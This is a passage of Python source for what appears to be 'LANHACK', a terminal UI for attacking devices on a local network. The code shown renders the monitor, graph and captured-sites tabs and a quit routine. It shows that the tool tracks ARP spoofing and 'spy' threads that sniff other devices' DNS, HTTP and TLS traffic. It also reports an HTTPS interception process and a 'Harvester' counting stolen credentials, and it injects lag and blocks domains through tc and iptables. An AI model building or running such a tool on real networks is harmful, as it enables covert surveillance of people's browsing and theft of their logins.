            self.query_one("#lag-btn", Button).label = "Remove Lag" if C.quick_tc_qdisc else "Add Lag"
            self.query_one("#lag-btn", Button).variant = "warning" if C.quick_tc_qdisc else "primary"
            if C.custom_blocks:
                parts = []
                for domain, ips in C.custom_blocks.items():
                    parts.append(f"{domain} -> {', '.join(ips[:3])}{'...' if len(ips) > 3 else ''}")
                status = f"[dim]{'  |  '.join(parts)}[/]"
            else:
                status = ""
            self.query_one("#domain-status", Static).update(status)
            gs = "[green]ON[/]" if C.global_dns_block else "[dim]OFF[/]"
            ss = " [green]Stealth[/]" if C.stealth_mode else ""
            hs = " [green]HTTPS[/]" if C.https_intercept_on else ""
            hvs = " [green]Harvester[/]" if C.harvester_on else ""
            cred_count = f" ({len(C.harvested_creds)})" if C.harvested_creds else ""
            self.query_one("#global-dns-status", Static).update(f"DNS:{gs}{ss}{hs}{hvs}{cred_count}")
            hvs = "[green]ACTIVE[/]" if C.harvester_on else "[dim]OFF[/]"
            self.query_one("#harvest-status", Static).update(f"Harvester: {hvs}{cred_count}")
        except: pass

    def build_monitor_tab(self):
        pane = self.query_one("#monitor")
        pane.remove_children()
        hb = Horizontal(
            Button("List View", id="list-view-btn", variant="primary"),
            Button("Graphs", id="graph-view-btn", variant="default"),
            id="monitor-bar"
        )
        pane.mount(hb)
        rl = RichLog(id="site-log", highlight=True, markup=True)
        rl.write("[bold cyan]LANHACK Live Monitor[/]")
        rl.write("")
        rl.write("[dim]Click [bold]All[/] in the Devices tab to spy on every device.[/]")
        rl.write("[dim]Or enter an IP and click [bold]Spy[/] for a single device.[/]")
        rl.write("")
        rl.write(f"[dim]Interface: {C.iface} | IP: {C.my_ip} | Gateway: {C.gateway_ip}[/]")
        if not C.iface:
            rl.write("[red]ERROR: No interface detected![/]")
        pane.mount(rl)

    def refresh_monitor(self):
        log = self.query_one("#site-log", RichLog)
        log.clear()
        total_cap = sum(len(v) for v in C.captured_sites.values())
        if C.show_graphs:
            log.write("[bold cyan]Live Traffic Graphs[/]")
            log.write("")
            log.write("[bold]Bandwidth per device (last 30 packets)[/]")
            has_bw = False
            for ip, data in sorted(C.bandwidth_data.items(), key=lambda x: sum(x[1]), reverse=True)[:5]:
                if ip == C.my_ip or ip == C.gateway_ip: continue
                total = sum(data)
                if total == 0: continue
                has_bw = True
                bar_len = min(total // 1024, 40)
                bar = "█" * bar_len + "░" * (40 - bar_len)
                label = device_label(ip)
                log.write(f"  {label:<30} {bar} {total//1024}KB")
            if not has_bw:
                log.write("  [dim]Waiting for traffic data...[/]")
            log.write("")
            log.write("[bold]Top domains[/]")
            has_domains = False
            for domain, hits in sorted(C.domain_hits.items(), key=lambda x: x[1], reverse=True)[:8]:
                if domain.startswith("total_bytes_"): continue
                has_domains = True
                bar_len = min(hits, 40)
                bar = "█" * bar_len + "░" * (40 - bar_len)
                log.write(f"  {domain:<35} {bar} {hits}")
            if not has_domains:
                log.write("  [dim]No domains captured yet.[/]")
        elif C.spy_threads and total_cap > 0:
            lines = []
            all_ips = sorted(C.captured_sites.keys(), key=lambda x: C.captured_sites[x][-1][0] if C.captured_sites[x] else "00:00:00", reverse=True)
            for ip in all_ips:
                if ip == C.my_ip or ip == C.gateway_ip: continue
                label = device_label(ip)
                for ts, site, stype, src, dst in C.captured_sites[ip][-3:]:
                    icon = {"dns":"D","http":"H","tls":"T"}.get(stype,"?")
                    lines.append(f"[{ts}] [{icon}] {label} -> {site}")
                    break
                if len(lines) >= 8: break
            log.write(f"[bold cyan]Captured: {total_cap} entries | Spying: {len(C.spy_threads)} devices[/]")
            log.write("")
            for line in lines:
                log.write(line)
        elif not C.spy_threads:
            log.write("[yellow]No targets being spied on.[/]")
            log.write("[dim]Click [bold]All[/] in Devices tab to spy on every device at once.[/]")
            err = f" ({C.sniff_error})" if C.sniff_error else ""
            log.write(f"[dim]Interface: {C.iface} | IP: {C.my_ip} | Sniffer: {'running' if C.sniff_thread and C.sniff_thread.is_alive() else 'STOPPED'}{err}[/]")
        else:
            sniffer_alive = C.sniff_thread and C.sniff_thread.is_alive()
            if sniffer_alive:
                log.write("[yellow]Sniffing active but no traffic yet...[/]")
            else:
                err = f" ({C.sniff_error})" if C.sniff_error else ""
                log.write(f"[red]Sniffer is STOPPED!{err}[/]")
            log.write(f"[dim]Spying on: {', '.join(C.spy_threads.keys())}[/]")
            err = f" ({C.sniff_error})" if C.sniff_error else ""
            log.write(f"[dim]Interface: {C.iface} | IP: {C.my_ip} | Captured: {total_cap} | Sniffer: {'running' if sniffer_alive else 'STOPPED'}{err}[/]")
            log.write("[dim]Try browsing a site on the target device.[/]")
        self.update_stats()

    def build_sites_tab(self):
        sites = []
        seen = set()
        for ip in sorted(C.captured_sites.keys()):
            for ts, site, stype, src, dst in C.captured_sites[ip]:
                k = f"{site}|{src}|{dst}"
                if k not in seen: seen.add(k); sites.append((ts, site, device_label(src)))
        sites = sites[-30:]
        try:
            dt = self.query_one("#site-table", DataTable)
            dt.clear()
            for ts, site, dev in sites:
                opener = main_site(site)
                hint = f"-> {opener}" if opener != site else ""
                dt.add_row(ts, "DNS", dev, site, hint)
        except Exception:
            pane = self.query_one("#sites")
            pane.remove_children()
            if not sites:
                pane.mount(Static("No sites captured yet. Go to Monitor tab to see live traffic."))
                return
            dt = DataTable(id="site-table")
            dt.add_columns("Time", "Type", "Device", "Site", "Open")
            for ts, site, dev in sites:
                opener = main_site(site)
                hint = f"-> {opener}" if opener != site else ""
                dt.add_row(ts, "DNS", dev, site, hint)
            pane.mount(dt)
            pane.mount(Horizontal(Button("Export CSV+JSON", id="export-btn", variant="primary"), id="export-row"))

    def on_tabbed_content_tab_activated(self, event):
        if event.pane and event.pane.id == "sites":
            self.build_sites_tab()
    
    def action_quit(self):
        C.quit_flag = True
        for ip in list(C.spoof_threads.keys()):
            _, ev = C.spoof_threads[ip]; ev.clear()
        for ip in list(C.spy_threads.keys()):
            _, ev = C.spy_threads[ip]; ev.clear()
        for t, _ in list(C.spoof_threads.values()):
            t.join(timeout=2)
        for t, _ in list(C.spy_threads.values()):
            t.join(timeout=2)
        subprocess.run(["tc", "qdisc", "del", "dev", C.iface, "root"], stderr=subprocess.DEVNULL)
        subprocess.run(["sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"], stdout=subprocess.DEVNULL)
        for domain, ips in list(C.custom_blocks.items()):
            for ip in ips:
                C.iptables.delete("FORWARD", ["-d", ip, "-j", "DROP"])
                C.iptables.delete("OUTPUT", ["-d", ip, "-j", "DROP"])
        C.iptables.restore()
        C.save_state()
        if C.mitm_process:
            try:
                C.mitm_process.terminate()
                C.mitm_process.wait(timeout=5)
            except: pass
        self.exit()
